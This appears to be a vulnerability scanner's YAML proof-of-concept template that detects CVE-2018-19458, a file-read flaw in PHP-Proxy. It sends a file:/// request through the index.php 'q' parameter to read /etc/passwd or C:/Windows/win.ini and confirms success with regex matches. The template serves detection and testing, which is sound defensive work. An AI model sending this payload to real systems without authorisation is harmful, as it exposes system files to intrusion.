name: poc-yaml-php-proxy-cve-2018-19458-fileread
binding: 587260ae-662e-4379-9a5f-44d6c45abd27
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://www.tenable.com/cve/CVE-2018-19458
    vulnerability:
        id: CT-8971
        level: high
transport: http
payloads:
    payloads:
        linux:
            filePath: |
                "etc/passwd"
            re: |
                "root:.*?:[0-9]*:[0-9]*:"
        win:
            filePath: |
                "C:/Windows/win.ini"
            re: |
                "for 16-bit app support"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?q=file:///{{filePath}}
        expression: response.status == 200 && re.bmatches(response.body)
expression: r0()
